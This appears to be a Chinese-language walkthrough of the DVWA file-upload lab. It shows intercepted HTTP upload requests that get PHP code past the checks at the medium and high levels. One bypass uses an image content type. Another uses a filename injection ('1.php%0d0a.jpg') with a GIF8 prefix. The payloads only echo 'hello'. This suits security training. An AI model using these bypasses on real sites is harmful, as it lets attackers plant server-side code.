# 文件上传

### 中等级

首先上传一个正常的图片格式,拦截请求

```http
// http

------WebKitFormBoundarycJvSDaue95Wxcq5z
Content-Disposition: form-data; name="uploaded"; filename="1.png"
Content-Type: image/png

PNG
```

首先尝试后端是否限制文件名

```
// http

------WebKitFormBoundarycJvSDaue95Wxcq5z
Content-Disposition: form-data; name="uploaded"; filename="1.php"
Content-Type: image/png

PNG
```

没有限制文件名,  接着测试 后端是否验证了文件的元信息. 全部删除图片的内容,添加一句简单php代码

```
// 
Content-Disposition: form-data; name="uploaded"; filename="1.php"
Content-Type: image/png

<?php echo("hello")?>

```

直接上传成功,并且能正常访问

### 高等级

&#x20;发送一个简单的图片后,拦截请求



1. 修改文件后缀, 不能上传

```http
// http

Content-Disposition: form-data; name="uploaded"; filename="trtggile.php"
Content-Type: image/png
```

2. 添加.png到文件名中,不能上传

```http
// http
Content-Disposition: form-data; name="uploaded"; filename="trtggile.png.php"
Content-Type: image/png
```

3. 看来只能 以jpg格式结尾, 那么就利用字符注入  ,我使用了,文件可以上传成功,也能成功访问

```http
// http
------WebKitFormBoundaryJSu5Ym5oUtVKfFCF
Content-Disposition: form-data; name="uploaded"; filename="1.php%0d0a.jpg"
Content-Type: image/png

GIF8<?php echo("hello")?>
```

<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

虽然后端通过了一下代码校验了 文件的`memi` 校验了文件的后缀名

```php
// php
if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) )
```

### 不可能

可以看到,每个请求将带上一个token&#x20;

<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

还将名字随机了,这样没法通过字符编码注入了,果断看一下

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

